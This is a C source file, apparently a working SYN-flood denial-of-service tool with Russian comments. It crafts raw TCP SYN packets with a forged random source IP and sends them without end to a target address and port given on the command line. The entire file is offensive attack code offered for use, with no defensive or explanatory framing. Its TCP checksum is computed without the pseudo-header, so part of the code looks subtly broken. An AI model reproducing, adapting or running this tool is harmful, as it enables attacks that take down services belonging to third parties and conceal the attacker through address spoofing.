#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

#define PACKET_LEN sizeof(struct iphdr) + sizeof(struct tcphdr)

unsigned short csum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while(len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if(len == 1) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void syn_flood(const char* target_ip, int target_port) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s == -1) {
        perror("socket");
        exit(1);
    }
    
    char packet[PACKET_LEN];
    memset(packet, 0, PACKET_LEN);
    
    struct iphdr *ip = (struct iphdr*)packet;
    struct tcphdr *tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
    
    // Заполнение IP заголовка
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(PACKET_LEN);
    ip->id = htons(rand());
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;
    ip->saddr = htonl(rand()); // Спуфинг исходного IP
    ip->daddr = inet_addr(target_ip);
    
    // Заполнение TCP заголовка
    tcp->source = htons(rand() % 65535);
    tcp->dest = htons(target_port);
    tcp->seq = htonl(rand());
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->window = htons(5840);
    tcp->check = 0;
    tcp->urg_ptr = 0;
    
    // Рассчет контрольных сумм
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = tcp->dest;
    dest.sin_addr.s_addr = ip->daddr;
    
    tcp->check = csum((unsigned short*)tcp, sizeof(struct tcphdr));
    ip->check = csum((unsigned short*)ip, sizeof(struct iphdr));
    
    // Отправка пакетов
    while(1) {
        if(sendto(s, packet, PACKET_LEN, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
            perror("sendto");
            break;
        }
        printf("SYN packet sent to %s:%d\n", target_ip, target_port);
        usleep(10000); // Задержка для снижения нагрузки на CPU
    }
    
    close(s);
}

int main(int argc, char *argv[]) {
    if(argc != 3) {
        printf("Usage: %s <target IP> <target port>\n", argv[0]);
        return 1;
    }
    
    srand(time(NULL));
    syn_flood(argv[1], atoi(argv[2]));
    return 0;
}